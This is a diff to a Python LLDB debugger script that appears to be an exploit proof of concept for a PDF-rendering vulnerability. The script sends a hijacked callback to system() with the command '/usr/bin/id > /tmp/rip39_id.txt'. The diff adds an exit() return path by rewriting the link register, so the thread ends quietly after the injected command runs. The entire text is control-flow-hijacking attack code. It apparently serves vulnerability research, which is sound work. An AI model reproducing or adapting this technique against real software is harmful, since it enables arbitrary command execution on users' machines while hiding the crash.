@@ -96,7 +96,7 @@ b_st = t.BreakpointCreateByName("aa_cache_render"); b_st.SetOneShot(True)
 p = t.LaunchSimple(["k2_s1000.pdf", "r.png", "k2_d31472.pdf", "k2_s1000.pdf"], None, CVE)
 R = None; CB = None; TGT = None; DRI = None
 FAKEPC = None; ARG0 = None; ARG1 = None; ARG2 = None
-SYS = None; CMD = None; sysfired = False
+SYS = None; CMD = None; EXIT = None; sysfired = False
 stores = 0; patched = 0; skips = 0; abandoned = False; direct = False; result = "incomplete"
 if p and p.IsValid():
     th = p.GetSelectedThread()
@@ -133,10 +133,11 @@ if p and p.IsValid():
             TGT = func_addr("hijacked_cb")
             DRI = func_addr("data_release_info")
             SYS = read_q(p, global_addr("g_system"))       # &system (shared cache, raw)
+            EXIT = read_q(p, global_addr("g_exit"))        # &exit (clean-return path)
             CMD = global_addr("g_cmd")
             CMDSTR = b"/usr/bin/id > /tmp/rip39_id.txt 2>&1\x00"
             t.BreakpointCreateByAddress(DRI + 24)  # blraaz x8 — LOG ONLY (prove natural load)
-            T("M2 R=%s CB=%s TGT=%s DRI=%s SYS=%s CMD=%s" % (hex(R) if R else None, hex(CB) if CB else None, hex(TGT) if TGT else None, hex(DRI) if DRI else None, hex(SYS) if SYS else None, hex(CMD) if CMD else None))
+            T("M2 R=%s CB=%s TGT=%s DRI=%s SYS=%s EXIT=%s CMD=%s" % (hex(R) if R else None, hex(CB) if CB else None, hex(TGT) if TGT else None, hex(DRI) if DRI else None, hex(SYS) if SYS else None, hex(EXIT) if EXIT else None, hex(CMD) if CMD else None))
             if SYS and CMD:
                 TGT = SYS  # gadget target
                 try:
@@ -214,6 +215,14 @@ if p and p.IsValid():
             if TGT and x8 == TGT:
                 sysfired = True
                 result = "GADGET-ARMED x8=system (natural load)"
+                if EXIT and b_w:
+                    try:
+                        t.BreakpointDelete(b_w.GetID()); b_w = 0
+                    except Exception:
+                        pass
+                    lr = fr.FindRegister("lr")
+                    lr.SetValueFromCString("0x%x" % EXIT)
+                    T("lr->exit(%x): after system() returns, thread exits cleanly" % EXIT)
             p.Continue()
         elif "data_release_info" in nm:
             x0 = reg(fr, "x0"); x8 = reg(fr, "x8")
